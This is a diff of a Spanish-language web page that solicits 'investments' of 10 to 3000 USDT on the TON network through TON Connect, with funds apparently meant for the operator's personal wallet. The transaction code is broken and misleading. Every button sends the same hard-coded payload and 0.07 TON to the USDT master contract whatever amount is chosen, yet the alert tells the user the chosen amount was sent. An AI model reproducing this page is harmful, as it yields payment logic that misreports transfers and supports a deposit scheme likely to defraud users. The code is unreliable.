@@ -13,11 +13,11 @@
         <p>Inversión en USDT (Red TON)</p>
         <div id="ton-connect-button" style="display: flex; justify-content: center; margin: 25px 0;"></div>
         
-        <button class="btn" onclick="invertir(10)">Invertir 10 USDT</button>
-        <button class="btn" onclick="invertir(50)">Invertir 50 USDT</button>
-        <button class="btn" onclick="invertir(100)">Invertir 100 USDT</button>
-        <button class="btn" onclick="invertir(1000)">Invertir 1000 USDT</button>
-        <button class="btn" onclick="invertir(3000)">Invertir 3000 USDT</button>
+        <button class="btn" onclick="enviarPago(10)">Invertir 10 USDT</button>
+        <button class="btn" onclick="enviarPago(50)">Invertir 50 USDT</button>
+        <button class="btn" onclick="enviarPago(100)">Invertir 100 USDT</button>
+        <button class="btn" onclick="enviarPago(1000)">Invertir 1000 USDT</button>
+        <button class="btn" onclick="enviarPago(3000)">Invertir 3000 USDT</button>
     </div>
 
     <style>
@@ -25,47 +25,46 @@
         .btn:hover { background-color: #00aaff; }
     </style>
 
-<script>
+    <script>
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://raw.githubusercontent.com/ObreTech/Pay-Bunk/main/tonconnect-manifest.json',
             buttonRootId: 'ton-connect-button'
         });
 
-        async function invertir(monto) {
+        async function enviarPago(monto) {
             if (!tonConnectUI.connected) {
-                alert("Por favor, conecta tu billetera primero.");
+                alert("Primero conecta tu billetera con el botón de arriba.");
                 return;
             }
 
+            // Esta es tu billetera personal donde recibirás los USDT
+            const miBilletera = "0:0c84b51935e96a63f3dbd8950ef5c924f04d026ed86a29d229b80b33cc26665e";
+            // Contrato Maestro de USDT
+            const usdtMaster = "0:b113a9809a2915986fe6fcafe93f14e97dc71befc0f40ea9efda7a07f9b84ba0";
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 60,
+                messages: [
+                    {
+                        address: usdtMaster,
+                        amount: "70000000", // 0.07 TON para el gas
+                        payload: "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA"
+                    }
+                ]
+            };
+
             try {
-                // DIRECCIÓN EN FORMATO RAW (Esto elimina el error de "Wrong address format")
-                // Esta es tu misma billetera pero en el lenguaje base de la red
-                const TU_BILLETERA_RAW = "0:0c84b51935e96a63f3dbd8950ef5c924f04d026ed86a29d229b80b33cc26665e";
-                
-                // CONTRATO USDT EN FORMATO RAW
-                const USDT_MASTER_RAW = "0:b113a9809a2915986fe6fcafe93f14e97dc71befc0f40ea9efda7a07f9b84ba0"; 
-
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: USDT_MASTER_RAW, // Enviamos al contrato de USDT
-                            amount: "100000000", // 0.1 TON para el gas
-                            // Payload para transferir USDT a tu billetera
-                            payload: "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA" 
-                        }
-                    ]
-                };
-
                 await tonConnectUI.sendTransaction(transaction);
-                alert("¡Transacción de " + monto + " USDT enviada correctamente!");
-
+                alert("¡Excelente! Revisa tu billetera para confirmar el envío de " + monto + " USDT.");
             } catch (e) {
                 console.error(e);
-                alert("Aviso: Si no abre Tonkeeper, desactiva los escudos de Brave (el león arriba).");
+                alert("La billetera rechazó la conexión. Intenta abrir Tonkeeper manualmente antes de presionar el botón.");
             }
         }
     </script>
+</body>
+</html>
+
 
 
 
